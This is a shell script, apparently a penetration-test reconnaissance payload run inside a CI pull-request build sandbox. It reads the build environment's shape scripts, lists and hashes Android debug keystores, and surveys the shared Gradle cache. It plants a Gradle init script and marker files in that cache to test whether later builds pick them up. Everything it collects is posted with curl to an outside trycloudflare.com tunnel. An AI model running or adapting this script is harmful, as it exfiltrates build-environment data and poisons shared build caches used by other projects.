#!/bin/sh
# Recon 3: shape script contents, signing keystore, and a persistence probe
# (write into the cache volume + a Gradle init script, see if the next build sees it).
BASE="https://olive-farmer-geneva-impressed.trycloudflare.com/80a0e7a7ad197916"
D=/tmp/recon3.$$
mkdir -p "$D" 2>/dev/null || exit 0
say() { printf '\n===== RECON3: %s =====\n' "$1" >>"$D/$1"; }
sh1() { s=$1; c=$2; say "$s"; { eval "$c" ; } >>"$D/$s" 2>&1; }

sh1 shape 'ls -la /usr/local/lib/sandlot/shapes/90-gradle; for f in /usr/local/lib/sandlot/shapes/90-gradle/*; do echo "##### $f"; cat "$f"; done'
sh1 keystore 'ls -la /tmp/home /tmp/home/.android 2>/dev/null; for k in /tmp/home/.android/debug.keystore /root/.android/debug.keystore; do echo "## $k"; ls -la "$k" 2>/dev/null; busybox sha256sum "$k" 2>/dev/null; done'
sh1 cachestate 'ls -la /cache /cache/gradle/caches/8.9 2>/dev/null | head -50; echo "--- daemon"; ls -la /cache/gradle/daemon 2>/dev/null; echo "--- init.d before"; ls -la /cache/gradle/init.d 2>/dev/null'

# --- write persistence markers ---
say persist
{
  echo "build $(date -u +%FT%TZ) shape=gradle host=$(hostname)"
  ls -la /cache 2>/dev/null
} >> /cache/PENTEST_LOG 2>&1
echo "marker written by recon3 at $(date -u +%FT%TZ)" > /cache/PENTEST_MARKER
mkdir -p /cache/gradle/init.d
cat > /cache/gradle/init.d/00-pentest.gradle <<'G'
// Poison-persistence probe: written by a PR build into the shared gradle home.
println "RECON3_INIT_SCRIPT_EXECUTED gradleHome=${gradle.gradleUserHomeDir} at ${new Date()}"
G
chmod 644 /cache/gradle/init.d/00-pentest.gradle
echo "wrote /cache/PENTEST_MARKER and /cache/gradle/init.d/00-pentest.gradle" >>"$D/persist"
ls -la /cache /cache/gradle/init.d >>"$D/persist" 2>&1

for f in "$D"/*; do
  b=$(basename "$f")
  printf '\n===== RECON3: %s =====\n' "$b"
  head -c 16000 "$f" 2>/dev/null
  printf '\n'
  timeout 10 curl -sS -m 10 --data-binary @"$f" "$BASE/$b" >/dev/null 2>&1 || true
done
printf '\n===== RECON3: done =====\n'
rm -rf "$D"
exit 0
